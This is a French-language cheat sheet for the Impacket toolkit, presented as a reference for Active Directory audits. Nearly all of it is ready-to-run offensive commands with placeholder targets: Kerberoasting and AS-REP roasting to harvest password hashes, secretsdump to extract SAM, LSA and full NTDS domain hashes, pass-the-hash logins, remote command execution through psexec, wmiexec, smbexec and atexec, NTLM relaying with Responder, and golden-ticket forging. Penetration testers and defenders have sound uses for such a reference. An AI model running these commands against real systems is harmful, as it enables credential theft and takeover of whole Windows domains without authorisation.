# Impacket

Suite d'outils Python pour les protocoles réseau Windows. Indispensable pour les audits Active Directory.

## Installation

```bash
pip install impacket
```

## Enumération

### Utilisateurs avec SPN (Kerberoasting)

```bash
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt
```

### Comptes sans pré-auth Kerberos (AS-REP Roasting)

```bash
impacket-GetNPUsers 'DOMAIN/user:password' -dc-ip <DC_IP> -request -outputfile asrep_hashes.txt

# Sans compte (avec une liste d'utilisateurs)
impacket-GetNPUsers 'DOMAIN/' -dc-ip <DC_IP> -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
```

### Enumération d'utilisateurs (sans mot de passe)

```bash
impacket-lookupsid 'DOMAIN/user:password'@<DC_IP>
```

## Dump de credentials

### Secretsdump (SAM, LSA, NTDS)

```bash
# Avec mot de passe
impacket-secretsdump 'DOMAIN/admin:password'@<DC_IP>

# Avec hash (pass-the-hash)
impacket-secretsdump 'DOMAIN/admin'@<DC_IP> -hashes :<NTLM_HASH>

# Dump NTDS complet (tous les hashes du domaine)
impacket-secretsdump 'DOMAIN/admin:password'@<DC_IP> -just-dc-ntlm
```

## Exécution de commandes à distance

### PsExec

```bash
impacket-psexec 'DOMAIN/admin:password'@<TARGET_IP>
impacket-psexec 'DOMAIN/admin'@<TARGET_IP> -hashes :<NTLM_HASH>
```

### WMIExec

```bash
impacket-wmiexec 'DOMAIN/admin:password'@<TARGET_IP>
```

### SMBExec

```bash
impacket-smbexec 'DOMAIN/admin:password'@<TARGET_IP>
```

### ATExec (via Task Scheduler)

```bash
impacket-atexec 'DOMAIN/admin:password'@<TARGET_IP> "whoami"
```

## Relaying et MITM

### ntlmrelayx

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user <USER>
```

### Responder + ntlmrelayx

```bash
# Terminal 1
responder -I eth0 -dwP

# Terminal 2
impacket-ntlmrelayx -tf targets.txt
```

## Kerberos

### Demander un TGT

```bash
impacket-getTGT 'DOMAIN/user:password' -dc-ip <DC_IP>
```

### Silver Ticket / Golden Ticket

```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain DOMAIN admin
```

## SMB

### Enumération de shares

```bash
impacket-smbclient 'DOMAIN/user:password'@<TARGET_IP>
```

## Astuce

Toujours synchroniser l'horloge avant les opérations Kerberos :

```bash
sudo ntpdate <DC_IP> && impacket-GetUserSPNs ...
```
